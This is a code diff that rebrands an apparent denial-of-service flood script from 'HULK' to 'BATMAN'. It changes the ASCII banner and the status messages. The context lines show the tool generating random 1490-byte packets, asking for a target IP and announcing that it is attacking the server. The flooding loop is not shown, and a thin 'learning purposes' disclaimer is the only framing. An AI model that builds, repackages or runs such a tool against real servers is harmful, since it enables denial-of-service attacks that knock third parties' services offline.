@@ -26,25 +26,28 @@ bytes = random._urandom(1490)
 os.system("clear")
 #Banner :
 print('''
-    ************************************************
-    *                                              *
-    * ██╗░░██╗░█████╗░██████╗░███╗░░░███╗░█████╗░  *
-    * ██║░██╔╝██╔══██╗██╔══██╗████╗░████║██╔══██╗  *
-    * █████═╝░███████║██████╔╝██╔████╔██║███████║  *  
-    * ██╔═██╗░██╔══██║██╔══██╗██║╚██╔╝██║██╔══██║  *
-    * ╚═╝░░╚═╝╚═╝░░╚═╝╚═╝░░╚═╝╚═╝░░░░░╚═╝╚═╝░░╚═╝  *
-    *          HTTP Unbearable Load King           *
-    *          Author: Raiizer                     *
-    *                                              *
-    ************************************************
-    ************************************************
-    *                                              *    
-    *  [!] Disclaimer :                            *
-    *  1. Don't Use For Personal Revenges          *
-    *  2. Author Is Not Responsible For Your Jobs  *
-    *  3. Use for learning purposes                * 
-    *  4. Does HULK suit in villain role, huh?     *
-    ************************************************
+  ************************************************
+  *                                              *
+  * 
+██████╗░░█████╗░████████╗███╗░░░███╗░█████╗░███╗░░██╗
+██╔══██╗██╔══██╗╚══██╔══╝████╗░████║██╔══██╗████╗░██║
+██████╦╝███████║░░░██║░░░██╔████╔██║███████║██╔██╗██║
+██╔══██╗██╔══██║░░░██║░░░██║╚██╔╝██║██╔══██║██║╚████║
+██████╦╝██║░░██║░░░██║░░░██║░╚═╝░██║██║░░██║██║░╚███║
+╚═════╝░╚═╝░░╚═╝░░░╚═╝░░░╚═╝░░░░░╚═╝╚═╝░░╚═╝╚═╝░░╚══╝
+  *                                              *
+  *          HTTP Unbearable Load King           *
+  *          Author: Raiizer                     *
+  *                                              *
+  ************************************************
+  ************************************************
+  *                                              *    
+  *  [!] Disclaimer :                            *
+  *  1. Don't Use For Personal Revenges          *
+  *  2. Author Is Not Responsible For Your Jobs  *
+  *  3. Use for learning purposes                * 
+  *  4. Does BATMAN suit in villain role, huh?   *
+  ************************************************
 	''')
 #Type your ip and port number (find IP address using nslookup or any online website) 
 ip = input(" [+] Give Karma A Target IP : ")
@@ -74,7 +77,7 @@ except ValidationError as exception :
 print(" ")
 print("    That's my secret Cap, I am always angry ")
 print(" " )
-print(" [+] HULK is attacking server " + ip )
+print(" [+] BATMAN is attacking server " + ip )
 print (" " )
 time.sleep(5)
 sent = 0
@@ -89,6 +92,7 @@ except KeyboardInterrupt:
 	print(" ")
 	print("\n [-] Ctrl+C Detected.........Exiting")
 	print(" [-] DDOS ATTACK STOPPED")
+	print("BATMAN GO TO BASE")
 input(" Enter To Exit")
 os.system("clear")
 print(" [-] Dr. Banner is tired...")
